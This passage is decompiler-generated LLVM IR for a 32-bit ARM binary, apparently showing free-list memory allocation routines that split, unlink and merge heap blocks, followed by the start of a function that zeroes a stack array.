  %v0_14490 = call i32 @function_142ec()
  %v0_14494.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14494

dec_label_pc_14494:                               ; preds = %dec_label_pc_14470, %dec_label_pc_14480
  %v0_14494 = phi i32 [ 0, %dec_label_pc_14470 ], [ %v0_14494.pre, %dec_label_pc_14480 ]
  store i32 %v0_14494, i32* @r7, align 4
  br label %dec_label_pc_144dc

dec_label_pc_1449c:                               ; preds = %bb14
  %v1_1449c = add i32 %v0_1449c, 28
  %tmp15 = icmp ugt i32 %v1_1449c, %v3_14414
  br i1 %tmp15, label %dec_label_pc_144dc, label %dec_label_pc_144a8

dec_label_pc_144a8:                               ; preds = %dec_label_pc_1449c
  %v1_144b4 = call i32 @function_14cd4()
  %v0_144b8 = load i32, i32* @r8, align 4
  %v1_144b8 = load i32, i32* @r5, align 4
  %v2_144b8 = add i32 %v1_144b8, %v0_144b8
  %v1_144bc = load i32, i32* @r6, align 4
  %v2_144bc = sub i32 %v1_144bc, %v1_144b8
  %v4_144c4 = call i32 @function_14648(i32* bitcast (i32** @global_var_1ea9c.617 to i32*), i32 %v2_144b8, i32 %v2_144bc)
  store i32 83160, i32* @lr, align 4
  %v1_144d4 = call i32 @function_14cd4()
  %v0_144d8 = load i32, i32* @r5, align 4
  %v1_144d8 = load i32, i32* @r7, align 4
  %v2_144d8 = add i32 %v1_144d8, -4
  %v3_144d8 = inttoptr i32 %v2_144d8 to i32*
  store i32 %v0_144d8, i32* %v3_144d8, align 4
  br label %dec_label_pc_144dc

dec_label_pc_144dc:                               ; preds = %.thread, %dec_label_pc_1449c, %dec_label_pc_14494, %dec_label_pc_144a8
  %v0_144dc = load i32, i32* @r7, align 4
  %v2_144e0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_144e0, i32* @r4, align 4
  store i32 %v6_143dc, i32* @r5, align 4
  store i32 %v9_143dc, i32* @r6, align 4
  store i32 %v12_143dc, i32* @r7, align 4
  store i32 %v15_143dc, i32* @r8, align 4
  ret i32 %v0_144dc

; uselistorder directives
  uselistorder i32 %v1_144b8, { 1, 0 }
  uselistorder i32 %v0_1449c, { 1, 2, 0 }
  uselistorder i32 %v3_14414, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder i32** @global_var_1ea9c.617, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_1ea9c.617 to i32*), { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i32)* @function_14140, { 3, 57, 0, 5, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 2, 1, 6, 4 }
  uselistorder i32 ()* @function_142ec, { 1, 0, 4, 3, 2, 5, 7, 6 }
  uselistorder label %dec_label_pc_144dc, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_14494, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %dec_label_pc_14408, { 1, 0 }
}

define i32 @function_144f4(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_144f4:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v1_144f4 = inttoptr i32 %arg2 to i32*
  %v2_144f4 = load i32, i32* %v1_144f4, align 4
  %v3_144f8 = load i32, i32* @r4, align 4
  store i32 %v3_144f8, i32* %stack_var_-8, align 4
  %v1_144fc = add i32 %v2_144f4, 3
  %v1_14500 = and i32 %v1_144fc, -4
  store i32 %v1_14500, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_14508 = icmp ugt i32 %v1_14500, 10
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_14510 = load i32, i32* %arg1, align 4
  store i32 %v2_14510, i32* %r0.global-to-local, align 4
  br i1 %v2_14508, label %dec_label_pc_1457c.preheader, label %bb

bb:                                               ; preds = %dec_label_pc_144f4
  store i32 12, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1457c.preheader

dec_label_pc_1457c.preheader:                     ; preds = %dec_label_pc_144f4, %bb
  %v1_14530 = phi i32 [ %v1_14500, %dec_label_pc_144f4 ], [ 12, %bb ]
  %v2_1457c9 = icmp eq i32 %v2_14510, 0
  br i1 %v2_1457c9, label %dec_label_pc_14584, label %dec_label_pc_1451c

dec_label_pc_1451c:                               ; preds = %dec_label_pc_1457c.preheader, %dec_label_pc_14578
  %v2_14534 = phi i32 [ %v3_14578, %dec_label_pc_14578 ], [ %v2_14510, %dec_label_pc_1457c.preheader ]
  %v1_1451c = inttoptr i32 %v2_14534 to i32*
  %v2_1451c = load i32, i32* %v1_1451c, align 4
  store i32 %v2_1451c, i32* %ip.global-to-local, align 4
  %v3_14520 = icmp ult i32 %v2_1451c, %v1_14530
  br i1 %v3_14520, label %dec_label_pc_14578, label %dec_label_pc_14528

dec_label_pc_14528:                               ; preds = %dec_label_pc_1451c
  %v1_14528 = add i32 %v1_14530, 44
  %v3_1452c = icmp ult i32 %v2_1451c, %v1_14528
  br i1 %v3_1452c, label %dec_label_pc_1453c, label %.thread._crit_edge

.thread._crit_edge:                               ; preds = %dec_label_pc_14528
  %v2_14520.le = sub i32 %v2_1451c, %v1_14530
  store i32 %v2_14520.le, i32* %v1_1451c, align 4
  %v0_14568.pre = load i32, i32* %ip.global-to-local, align 4
  %v0_14570.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb29

dec_label_pc_1453c:                               ; preds = %dec_label_pc_14528
  %v1_1453c = add i32 %v2_14534, 4
  %v2_1453c = inttoptr i32 %v1_1453c to i32*
  %v3_1453c = load i32, i32* %v2_1453c, align 4
  store i32 %v3_1453c, i32* %r2.global-to-local, align 4
  %v2_14540 = icmp eq i32 %v3_1453c, 0
  br i1 %v2_14540, label %.thread2, label %bb27

bb27:                                             ; preds = %dec_label_pc_1453c
  %v2_14544 = add i32 %v2_14534, 8
  %v3_14544 = inttoptr i32 %v2_14544 to i32*
  %v4_14544 = load i32, i32* %v3_14544, align 4
  %v3_14548 = add i32 %v3_1453c, 8
  %v4_14548 = inttoptr i32 %v3_14548 to i32*
  store i32 %v4_14544, i32* %v4_14548, align 4
  %v0_1454c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1453c, %bb27
  %v0_1454c = phi i32 [ %v2_14534, %dec_label_pc_1453c ], [ %v0_1454c.pre, %bb27 ]
  %v1_1454c = add i32 %v0_1454c, 8
  %v2_1454c = inttoptr i32 %v1_1454c to i32*
  %v3_1454c = load i32, i32* %v2_1454c, align 4
  %v1_14550 = add i32 %v0_1454c, 4
  %v2_14550 = inttoptr i32 %v1_14550 to i32*
  %v3_14550 = load i32, i32* %v2_14550, align 4
  %v2_14554 = icmp eq i32 %v3_1454c, 0
  br i1 %v2_14554, label %.thread5, label %bb28

bb28:                                             ; preds = %.thread2
  %v3_14558 = add i32 %v3_1454c, 4
  %v4_14558 = inttoptr i32 %v3_14558 to i32*
  store i32 %v3_14550, i32* %v4_14558, align 4
  %v1_14560 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v1_14560, i32* %r2.global-to-local, align 4
  br label %bb29

.thread5:                                         ; preds = %.thread2
  %v2_1455c = load i32, i32* %r1.global-to-local, align 4
  %v3_1455c = inttoptr i32 %v2_1455c to i32*
  store i32 %v3_14550, i32* %v3_1455c, align 4
  %v1_14564.pre = load i32, i32* %ip.global-to-local, align 4
  store i32 %v1_14564.pre, i32* %r2.global-to-local, align 4
  br label %bb29

bb29:                                             ; preds = %bb28, %.thread._crit_edge, %.thread5
  %v0_14570 = phi i32 [ %v0_14570.pre, %.thread._crit_edge ], [ %v1_14560, %bb28 ], [ %v1_14564.pre, %.thread5 ]
  %v0_14568 = phi i32 [ %v0_14568.pre, %.thread._crit_edge ], [ %v1_14560, %bb28 ], [ %v1_14564.pre, %.thread5 ]
  %v1_14568 = load i32, i32* %r0.global-to-local, align 4
  %v2_14568 = sub i32 %v1_14568, %v0_14568
  %v1_1456c = add i32 %v2_14568, 12
  store i32 %v1_1456c, i32* %r0.global-to-local, align 4
  %v1_14570 = load i32, i32* %r4.global-to-local, align 4
  %v2_14570 = inttoptr i32 %v1_14570 to i32*
  store i32 %v0_14570, i32* %v2_14570, align 4
  %v2_14574 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14574, i32* %r4.global-to-local, align 4
  ret i32 %v1_1456c

dec_label_pc_14578:                               ; preds = %dec_label_pc_1451c
  %v1_14578 = add i32 %v2_14534, 4
  %v2_14578 = inttoptr i32 %v1_14578 to i32*
  %v3_14578 = load i32, i32* %v2_14578, align 4
  store i32 %v3_14578, i32* %r0.global-to-local, align 4
  %v2_1457c = icmp eq i32 %v3_14578, 0
  br i1 %v2_1457c, label %dec_label_pc_1457c.dec_label_pc_14584_crit_edge, label %dec_label_pc_1451c

dec_label_pc_1457c.dec_label_pc_14584_crit_edge:  ; preds = %dec_label_pc_14578
  br label %dec_label_pc_14584

dec_label_pc_14584:                               ; preds = %dec_label_pc_1457c.dec_label_pc_14584_crit_edge, %dec_label_pc_1457c.preheader
  store i32 %v3_144f8, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_14578, { 1, 2, 0 }
  uselistorder i32 %v0_1454c, { 1, 0 }
  uselistorder i32 %v2_1451c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_14534, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_14530, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 5, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 1, 3 }
  uselistorder label %bb29, { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_1451c, { 1, 0 }
  uselistorder label %dec_label_pc_1457c.preheader, { 1, 0 }
}

define i32 @function_14588(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_14588:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_1458c = load i32, i32* %arg1, align 4
  store i32 %v2_1458c, i32* %ip.global-to-local, align 4
  store i32 %tmp, i32* %lr.global-to-local, align 4
  %v2_146046 = icmp eq i32 %v2_1458c, 0
  br i1 %v2_146046, label %dec_label_pc_1460c, label %dec_label_pc_14598

dec_label_pc_14598:                               ; preds = %dec_label_pc_14588, %dec_label_pc_14600
  %v0_145d8 = phi i32 [ %v3_14600, %dec_label_pc_14600 ], [ %v2_1458c, %dec_label_pc_14588 ]
  %v1_14598 = inttoptr i32 %v0_145d8 to i32*
  %v2_14598 = load i32, i32* %v1_14598, align 4
  store i32 %v2_14598, i32* %r0.global-to-local, align 4
  %v2_1459c = sub i32 %v0_145d8, %v2_14598
  %v1_145a0 = add i32 %v2_1459c, 12
  %v3_145a4 = icmp uge i32 %v1_145a0, %arg2
  %v9_145a4 = icmp eq i32 %v1_145a0, %arg2
  %v2_145a8 = xor i1 %v9_145a4, true
  %v3_145a8 = and i1 %v3_145a4, %v2_145a8
  br i1 %v3_145a8, label %dec_label_pc_14600, label %dec_label_pc_145ac

dec_label_pc_145ac:                               ; preds = %dec_label_pc_14598
  br i1 %v9_145a4, label %dec_label_pc_145b0, label %dec_label_pc_1460c

dec_label_pc_145b0:                               ; preds = %dec_label_pc_145ac
  %v1_145b0 = add i32 %arg3, 3
  %v1_145b4 = and i32 %v1_145b0, -4
  store i32 %v1_145b4, i32* %r2.global-to-local, align 4
  %v2_145b8 = sub i32 %v2_14598, %v1_145b4
  %v3_145b8 = icmp ult i32 %v2_14598, %v1_145b4
  br i1 %v3_145b8, label %dec_label_pc_1460c, label %dec_label_pc_145c0

dec_label_pc_145c0:                               ; preds = %dec_label_pc_145b0
  %v1_145c0 = add i32 %v1_145b4, 44
  %v3_145c4 = icmp ult i32 %v2_14598, %v1_145c0
  br i1 %v3_145c4, label %.thread2, label %bb

bb:                                               ; preds = %dec_label_pc_145c0
  store i32 %v2_145b8, i32* %v1_14598, align 4
  %v1_145d0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_145d0, i32* %r0.global-to-local, align 4
  ret i32 %v1_145d0

.thread2:                                         ; preds = %dec_label_pc_145c0
  %v1_145d8 = add i32 %v0_145d8, 4
  %v2_145d8 = inttoptr i32 %v1_145d8 to i32*
  %v3_145d8 = load i32, i32* %v2_145d8, align 4
  store i32 %v3_145d8, i32* %r2.global-to-local, align 4
  %v2_145dc = icmp eq i32 %v3_145d8, 0
  br i1 %v2_145dc, label %.thread3, label %bb17

bb17:                                             ; preds = %.thread2
  %v2_145e0 = add i32 %v0_145d8, 8
  %v3_145e0 = inttoptr i32 %v2_145e0 to i32*
  %v4_145e0 = load i32, i32* %v3_145e0, align 4
  %v3_145e4 = add i32 %v3_145d8, 8
  %v4_145e4 = inttoptr i32 %v3_145e4 to i32*
  store i32 %v4_145e0, i32* %v4_145e4, align 4
  %v0_145e8.pre = load i32, i32* %ip.global-to-local, align 4
  br label %.thread3

.thread3:                                         ; preds = %.thread2, %bb17
  %v0_145e8 = phi i32 [ %v0_145d8, %.thread2 ], [ %v0_145e8.pre, %bb17 ]
  %v1_145e8 = add i32 %v0_145e8, 8
  %v2_145e8 = inttoptr i32 %v1_145e8 to i32*
  %v3_145e8 = load i32, i32* %v2_145e8, align 4
  store i32 %v3_145e8, i32* %r2.global-to-local, align 4
  %v1_145ec = add i32 %v0_145e8, 4
  %v2_145ec = inttoptr i32 %v1_145ec to i32*
  %v3_145ec = load i32, i32* %v2_145ec, align 4
  %v2_145f0 = icmp eq i32 %v3_145e8, 0
  br i1 %v2_145f0, label %.thread4, label %bb18

bb18:                                             ; preds = %.thread3
  %v3_145f4 = add i32 %v3_145e8, 4
  %v4_145f4 = inttoptr i32 %v3_145f4 to i32*
  store i32 %v3_145ec, i32* %v4_145f4, align 4
  br label %bb19

.thread4:                                         ; preds = %.thread3
  %v2_145f8 = load i32, i32* %lr.global-to-local, align 4
  %v3_145f8 = inttoptr i32 %v2_145f8 to i32*
  store i32 %v3_145ec, i32* %v3_145f8, align 4
  br label %bb19

bb19:                                             ; preds = %bb18, %.thread4
  %v5_145fc = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v5_145fc

dec_label_pc_14600:                               ; preds = %dec_label_pc_14598
  %v1_14600 = add i32 %v0_145d8, 4
  %v2_14600 = inttoptr i32 %v1_14600 to i32*
  %v3_14600 = load i32, i32* %v2_14600, align 4
  store i32 %v3_14600, i32* %ip.global-to-local, align 4
  %v2_14604 = icmp eq i32 %v3_14600, 0
  br i1 %v2_14604, label %dec_label_pc_14604.dec_label_pc_1460c.loopexit_crit_edge, label %dec_label_pc_14598

dec_label_pc_14604.dec_label_pc_1460c.loopexit_crit_edge: ; preds = %dec_label_pc_14600
  br label %dec_label_pc_1460c

dec_label_pc_1460c:                               ; preds = %dec_label_pc_145b0, %dec_label_pc_14588, %dec_label_pc_14604.dec_label_pc_1460c.loopexit_crit_edge, %dec_label_pc_145ac
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_14600, { 1, 2, 0 }
  uselistorder i32 %v0_145e8, { 1, 0 }
  uselistorder i32 %v1_145b4, { 0, 2, 1, 3 }
  uselistorder i1 %v9_145a4, { 1, 0 }
  uselistorder i32 %v2_14598, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_145d8, { 3, 2, 1, 0, 5, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 0 }
  uselistorder label %dec_label_pc_1460c, { 2, 0, 3, 1 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_14598, { 1, 0 }
}

define i32 @function_14614() local_unnamed_addr {
dec_label_pc_14614:
  %v0_14614 = load i32, i32* @r2, align 4
  %v2_14614 = icmp eq i32 %v0_14614, 0
  %v0_14618 = load i32, i32* @r3, align 4
  %v1_14618 = load i32, i32* @r1, align 4
  %v2_14618 = add i32 %v1_14618, 4
  %v3_14618 = inttoptr i32 %v2_14618 to i32*
  store i32 %v0_14618, i32* %v3_14618, align 4
  %v0_1461c = load i32, i32* @r2, align 4
  %v1_1461c = load i32, i32* @r1, align 4
  %v2_1461c = add i32 %v1_1461c, 8
  %v3_1461c = inttoptr i32 %v2_1461c to i32*
  store i32 %v0_1461c, i32* %v3_1461c, align 4
  %v1_14624 = load i32, i32* @r1, align 4
  br i1 %v2_14614, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_14614
  %v2_14620 = load i32, i32* @r2, align 4
  %v3_14620 = add i32 %v2_14620, 4
  %v4_14620 = inttoptr i32 %v3_14620 to i32*
  store i32 %v1_14624, i32* %v4_14620, align 4
  br label %bb1

.thread:                                          ; preds = %dec_label_pc_14614
  %v2_14624 = load i32, i32* @r0, align 4
  %v3_14624 = inttoptr i32 %v2_14624 to i32*
  store i32 %v1_14624, i32* %v3_14624, align 4
  br label %bb1

bb1:                                              ; preds = %bb, %.thread
  %v0_14628 = load i32, i32* @r3, align 4
  %v2_14628 = icmp eq i32 %v0_14628, 0
  br i1 %v2_14628, label %bb3, label %bb2

bb2:                                              ; preds = %bb1
  %v1_1462c = load i32, i32* @r1, align 4
  %v3_1462c = add i32 %v0_14628, 8
  %v4_1462c = inttoptr i32 %v3_1462c to i32*
  store i32 %v1_1462c, i32* %v4_1462c, align 4
  br label %bb3

bb3:                                              ; preds = %bb1, %bb2
  %v1_14630 = load i32, i32* @r0, align 4
  ret i32 %v1_14630

; uselistorder directives
  uselistorder i32 %v1_14624, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_14634() local_unnamed_addr {
dec_label_pc_14634:
  %v0_14634 = load i32, i32* @r2, align 4
  %v2_14634 = icmp eq i32 %v0_14634, 0
  %v1_14638 = load i32, i32* @r1, align 4
  br i1 %v2_14634, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14634
  %v2_14638 = load i32, i32* @r0, align 4
  %v3_14638 = inttoptr i32 %v2_14638 to i32*
  store i32 %v1_14638, i32* %v3_14638, align 4
  br label %bb2

.thread:                                          ; preds = %dec_label_pc_14634
  %v3_1463c = add i32 %v0_14634, 4
  %v4_1463c = inttoptr i32 %v3_1463c to i32*
  store i32 %v1_14638, i32* %v4_1463c, align 4
  br label %bb2

bb2:                                              ; preds = %bb, %.thread
  %v0_14640 = load i32, i32* @r2, align 4
  %v1_14640 = load i32, i32* @r1, align 4
  %v2_14640 = add i32 %v1_14640, 8
  %v3_14640 = inttoptr i32 %v2_14640 to i32*
  store i32 %v0_14640, i32* %v3_14640, align 4
  %v1_14644 = load i32, i32* @r0, align 4
  ret i32 %v1_14644

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_14648(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_14648:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_14648 = load i32, i32* @r4, align 4
  store i32 %v3_14648, i32* %stack_var_-20, align 4
  %v2_1464c = load i32, i32* %arg1, align 4
  store i32 %v2_1464c, i32* %r4.global-to-local, align 4
  %v2_14650 = add i32 %arg3, %arg2
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_1466c2 = icmp eq i32 %v2_1464c, 0
  br i1 %v2_1466c2, label %dec_label_pc_1471c, label %dec_label_pc_1465c

dec_label_pc_1465c:                               ; preds = %dec_label_pc_14648, %dec_label_pc_14664
  %v0_146ac = phi i32 [ %v0_146b4, %dec_label_pc_14664 ], [ 0, %dec_label_pc_14648 ]
  %v0_146b4 = phi i32 [ %v3_14668, %dec_label_pc_14664 ], [ %v2_1464c, %dec_label_pc_14648 ]
  %v1_146705.in = phi i32 [ %v3_14668, %dec_label_pc_14664 ], [ %v2_1464c, %dec_label_pc_14648 ]
  %v1_146705 = add i32 %v1_146705.in, 12
  %v3_1465c = icmp ult i32 %v1_146705, %arg2
  br i1 %v3_1465c, label %dec_label_pc_14664, label %dec_label_pc_1467c

dec_label_pc_14664:                               ; preds = %dec_label_pc_1465c
  store i32 %v0_146b4, i32* %r6.global-to-local, align 4
  %v1_14668 = add i32 %v0_146b4, 4
  %v2_14668 = inttoptr i32 %v1_14668 to i32*
  %v3_14668 = load i32, i32* %v2_14668, align 4
  store i32 %v3_14668, i32* %r4.global-to-local, align 4
  %v2_1466c = icmp eq i32 %v3_14668, 0
  br i1 %v2_1466c, label %dec_label_pc_1466c.dec_label_pc_1471c.loopexit_crit_edge, label %dec_label_pc_1465c

dec_label_pc_1467c:                               ; preds = %dec_label_pc_1465c
  %v1_1467c = inttoptr i32 %v0_146b4 to i32*
  %v2_1467c = load i32, i32* %v1_1467c, align 4
  %v2_14680 = sub i32 %v0_146b4, %v2_1467c
  %v1_14684 = add i32 %v2_14680, 12
  %v3_14688 = icmp uge i32 %v1_14684, %v2_14650
  %v9_14688 = icmp eq i32 %v1_14684, %v2_14650
  %v2_1468c = xor i1 %v9_14688, true
  %v3_1468c = and i1 %v3_14688, %v2_1468c
  br i1 %v3_1468c, label %dec_label_pc_1471c, label %dec_label_pc_14690

dec_label_pc_14690:                               ; preds = %dec_label_pc_1467c
  %v2_14690 = add i32 %v2_1467c, %arg3
  store i32 %v2_14690, i32* %r7.global-to-local, align 4
  br i1 %v9_14688, label %dec_label_pc_14698, label %dec_label_pc_146c4

dec_label_pc_14698:                               ; preds = %dec_label_pc_14690
  %v2_14698 = icmp eq i32 %v0_146ac, 0
  br i1 %v2_14698, label %dec_label_pc_14710, label %dec_label_pc_146a0

dec_label_pc_146a0:                               ; preds = %dec_label_pc_14698
  %v1_146a0 = add i32 %v0_146ac, 12
  %v9_146a4 = icmp eq i32 %v1_146a0, %arg2
  br i1 %v9_146a4, label %dec_label_pc_146ac, label %dec_label_pc_14710

dec_label_pc_146ac:                               ; preds = %dec_label_pc_146a0
  %v1_146ac = inttoptr i32 %v0_146ac to i32*
  %v2_146ac = load i32, i32* %v1_146ac, align 4
  %v1_146b0 = add i32 %v0_146ac, 8
  %v2_146b0 = inttoptr i32 %v1_146b0 to i32*
  %v3_146b0 = load i32, i32* %v2_146b0, align 4
  store i32 %v3_146b0, i32* @r2, align 4
  store i32 %v0_146b4, i32* @r1, align 4
  %v2_146b8 = add i32 %v2_146ac, %v2_14690
  store i32 %v2_146b8, i32* %r7.global-to-local, align 4
  %v0_146bc = call i32 @function_14634()
  br label %dec_label_pc_14710

dec_label_pc_146c4:                               ; preds = %dec_label_pc_14690
  %v1_146c4 = add i32 %v0_146b4, 4
  %v2_146c4 = inttoptr i32 %v1_146c4 to i32*
  %v3_146c4 = load i32, i32* %v2_146c4, align 4
  store i32 %v3_146c4, i32* %r5.global-to-local, align 4
  %v2_146c8 = icmp eq i32 %v3_146c4, 0
  br i1 %v2_146c8, label %dec_label_pc_146fc, label %dec_label_pc_146d0

dec_label_pc_146d0:                               ; preds = %dec_label_pc_146c4
  %v1_146d0 = inttoptr i32 %v3_146c4 to i32*
  %v2_146d0 = load i32, i32* %v1_146d0, align 4
  %v2_146d4 = sub i32 %v3_146c4, %v2_146d0
  %v1_146d8 = add i32 %v2_146d4, 12
  %v9_146dc = icmp eq i32 %v2_14650, %v1_146d8
  br i1 %v9_146dc, label %dec_label_pc_146e4, label %dec_label_pc_146fc

dec_label_pc_146e4:                               ; preds = %dec_label_pc_146d0
  store i32 %v0_146ac, i32* @r2, align 4
  store i32 %v3_146c4, i32* @r1, align 4
  %v2_146ec = add i32 %v2_146d0, %v2_14690
  store i32 %v2_146ec, i32* %r7.global-to-local, align 4
  %v0_146f0 = call i32 @function_14634()
  %v0_146f4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_146f4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14710

dec_label_pc_146fc:                               ; preds = %dec_label_pc_146d0, %dec_label_pc_146c4
  %v2_146fc = add i32 %v0_146b4, %arg3
  store i32 %v2_146fc, i32* %r4.global-to-local, align 4
  store i32 %v3_146c4, i32* @r3, align 4
  store i32 %v0_146ac, i32* @r2, align 4
  store i32 %v2_146fc, i32* @r1, align 4
  %v0_1470c = call i32 @function_14614()
  br label %dec_label_pc_14710

dec_label_pc_14710:                               ; preds = %dec_label_pc_146a0, %dec_label_pc_14698, %dec_label_pc_146e4, %dec_label_pc_146ac, %dec_label_pc_146fc
  %v0_14710 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14710, i32* %r5.global-to-local, align 4
  %v0_14714 = load i32, i32* %r7.global-to-local, align 4
  %v2_14714 = inttoptr i32 %v0_14710 to i32*
  store i32 %v0_14714, i32* %v2_14714, align 4
  br label %dec_label_pc_14734

dec_label_pc_1466c.dec_label_pc_1471c.loopexit_crit_edge: ; preds = %dec_label_pc_14664
  br label %dec_label_pc_1471c

dec_label_pc_1471c:                               ; preds = %dec_label_pc_14648, %dec_label_pc_1466c.dec_label_pc_1471c.loopexit_crit_edge, %dec_label_pc_1467c
  %v1_1471c = add i32 %v2_14650, -12
  store i32 %v1_1471c, i32* %r5.global-to-local, align 4
  %v3_14720 = inttoptr i32 %v1_1471c to i32*
  store i32 %arg3, i32* %v3_14720, align 4
  %v0_14724 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14724, i32* @r3, align 4
  %v0_14728 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_14728, i32* @r2, align 4
  %v0_1472c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1472c, i32* @r1, align 4
  %v0_14730 = call i32 @function_14614()
  br label %dec_label_pc_14734

dec_label_pc_14734:                               ; preds = %dec_label_pc_14710, %dec_label_pc_1471c
  %v0_14734 = load i32, i32* %r5.global-to-local, align 4
  %v2_14738 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_14738, i32* @r4, align 4
  ret i32 %v0_14734

; uselistorder directives
  uselistorder i32 %v3_146c4, { 0, 1, 3, 2, 4, 5 }
  uselistorder i1 %v9_14688, { 1, 0 }
  uselistorder i32 %v3_14668, { 2, 3, 1, 0 }
  uselistorder i32 %v0_146b4, { 0, 2, 1, 3, 4, 6, 7, 5 }
  uselistorder i32 %v0_146ac, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 ()* @function_14614, { 1, 0 }
  uselistorder i32* @r3, { 0, 3, 1, 2, 4 }
  uselistorder i32 ()* @function_14634, { 1, 0 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14734, { 1, 0 }
  uselistorder label %dec_label_pc_1471c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14710, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1465c, { 1, 0 }
}

define i32 @function_1473c() local_unnamed_addr {
dec_label_pc_14758.lr.ph:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %stack_var_-268 = alloca i32, align 4
  %v2_1473c = ptrtoint i32* %stack_var_-268 to i32
  %v1_1474c = call i32 @function_14cd4()
  store i32 31, i32* %r1.global-to-local, align 4
  %v2_14758 = ptrtoint i32* %stack_var_0 to i32
  br label %dec_label_pc_14758

dec_label_pc_14758:                               ; preds = %dec_label_pc_14758.lr.ph, %dec_label_pc_14758
  %v1_1475c = phi i32 [ 31, %dec_label_pc_14758.lr.ph ], [ %v1_14768, %dec_label_pc_14758 ]
  %v4_1475c = mul i32 %v1_1475c, 4
  %v5_1475c = add i32 %v4_1475c, %v2_14758
  %v2_14764 = add i32 %v5_1475c, -128
  %v3_14764 = inttoptr i32 %v2_14764 to i32*
  store i32 0, i32* %v3_14764, align 4
  %v0_14768 = load i32, i32* %r1.global-to-local, align 4
  %v1_14768 = add i32 %v0_14768, -1
  store i32 %v1_14768, i32* %r1.global-to-local, align 4
  %v6_14768 = icmp slt i32 %v1_14768, 0
  br i1 %v6_14768, label %dec_label_pc_14770, label %dec_label_pc_14758

dec_label_pc_14770:                               ; preds = %dec_label_pc_14758
  %v2_14770 = ptrtoint i32* %stack_var_-128 to i32
